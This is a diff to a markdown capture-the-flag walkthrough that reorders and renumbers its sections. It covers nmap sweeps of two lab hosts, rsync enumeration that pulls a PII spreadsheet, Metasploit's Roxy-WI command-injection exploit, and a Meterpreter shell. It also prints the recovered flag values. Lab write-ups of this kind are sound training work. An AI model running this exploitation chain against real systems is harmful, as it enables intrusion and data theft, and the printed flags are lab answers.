@@ -6,7 +6,7 @@ Each command is annotated with its operational environment (`Kali Linux (bash)`,
 
 ---
 
-## 1. Network Reconnaissance & Port Scanning
+## 1. Target 1: Reconnaissance & Port Scanning
 
 ### Full TCP Port Sweep on Target 1 (`target1.ine.local`)
 **Environment:** `Kali Linux (bash)`
@@ -23,20 +23,9 @@ nmap -T4 -sV -sC -p- target1.ine.local
 - **Expected Result**: Identifies open port `873/tcp` running `rsync` (protocol version 31).
 - **Screenshot Reference**: `02-nmap-target1-rsync-scan.png` (Screenshot 02).
 
-### Full TCP Port Sweep on Target 2 (`target2.ine.local`)
-**Environment:** `Kali Linux (bash)`
-```bash
-nmap -T4 -sV -sC -p- target2.ine.local
-```
-- **What it does**: Conducts an exhaustive TCP sweep against `target2.ine.local` (`192.244.166.4`).
-- **Why it is used**: Maps the web services, SSL configuration, and hostnames hosted on Target 2.
-- **Key Parameters**: Same as Target 1 scan.
-- **Expected Result**: Identifies `80/tcp` (HTTP) and `443/tcp` (HTTPS) running Apache `httpd 2.4.52` on Ubuntu, hosting the `Roxy-WI` web management application with SSL certificate issued for `*.roxy-wi.org`.
-- **Screenshot Reference**: `07-nmap-target2-service-scan.png` (Screenshot 07).
-
 ---
 
-## 2. RSYNC Enumeration & Data Exfiltration (Target 1)
+## 2. Target 1: RSYNC Enumeration & Data Exfiltration (Flags 1 & 2)
 
 ### Querying RSYNC Modules and Banner (Flag 1 Retrieval)
 **Environment:** `Kali Linux (bash)`
@@ -97,7 +86,22 @@ cat pii_data.xlsx
 
 ---
 
-## 3. Metasploit Framework Setup & Auxiliary Enumeration
+## 3. Target 2: Reconnaissance & Service Enumeration
+
+### Full TCP Port Sweep on Target 2 (`target2.ine.local`)
+**Environment:** `Kali Linux (bash)`
+```bash
+nmap -T4 -sV -sC -p- target2.ine.local
+```
+- **What it does**: Conducts an exhaustive TCP sweep against `target2.ine.local` (`192.244.166.4`).
+- **Why it is used**: Maps the web services, SSL configuration, and hostnames hosted on Target 2.
+- **Key Parameters**: Same as Target 1 scan.
+- **Expected Result**: Identifies `80/tcp` (HTTP) and `443/tcp` (HTTPS) running Apache `httpd 2.4.52` on Ubuntu, hosting the `Roxy-WI` web management application with SSL certificate issued for `*.roxy-wi.org`.
+- **Screenshot Reference**: `07-nmap-target2-service-scan.png` (Screenshot 07).
+
+---
+
+## 4. Metasploit Framework Setup & Auxiliary Enumeration
 
 ### Launching msfconsole in Quiet Mode
 **Environment:** `Kali Linux (bash)`
@@ -128,7 +132,7 @@ msf6 auxiliary(scanner/rsync/modules_list) > run
 
 ---
 
-## 4. Exploitation: Roxy-WI Command Injection (Target 2)
+## 5. Exploitation: Roxy-WI Command Injection (Target 2)
 
 ### Searching for Roxy-WI Exploit Modules
 **Environment:** `msfconsole`
@@ -180,7 +184,7 @@ msf6 exploit(linux/http/roxy_wi_exec) > exploit
 
 ---
 
-## 5. Session Management & Initial Access Verification
+## 6. Session Management & Initial Access Verification
 
 ### Interacting with Meterpreter & Spawning a Linux Shell
 **Environment:** `Meterpreter`
@@ -204,7 +208,7 @@ meterpreter > shell
 
 ---
 
-## 6. Flag 3 Retrieval: Root Filesystem Enumeration
+## 7. Flag 3 Retrieval: Root Filesystem Enumeration
 
 ### Locating and Reading `flag.txt`
 **Environment:** `Linux Command Shell (bash)`
@@ -220,11 +224,11 @@ cat flag.txt
   FLAG3_aa0038d5756743bfa80796ebea45bdd2
   ```
 - **Verified Flag 3 Value**: `FLAG3_aa0038d5756743bfa80796ebea45bdd2`
-- **Screenshot References**: `11-meterpreter-shell-target2.png` and `12-target2-flag3-retrieval.png`.
+- **Screenshot Reference**: `12-target2-flag3-retrieval.png` (Screenshot 12).
 
 ---
 
-## 7. Flag 4 Retrieval: Scheduled Tasks (Cron) Investigation
+## 8. Flag 4 Retrieval: Scheduled Tasks (Cron) Investigation
 
 ### Navigating to `/etc` and Recursively Grepping for Flags
 **Environment:** `Linux Command Shell (bash)`
@@ -257,7 +261,7 @@ grep -ri "flag" /etc
 
 ---
 
-## 8. Summary of Verified Flag Values
+## 9. Summary of Verified Flag Values
 
 | Flag | Target Host | Operating Context | Source / Location | Verified Flag String | Validation Status |
 | :---: | :---: | :--- | :--- | :--- | :---: |
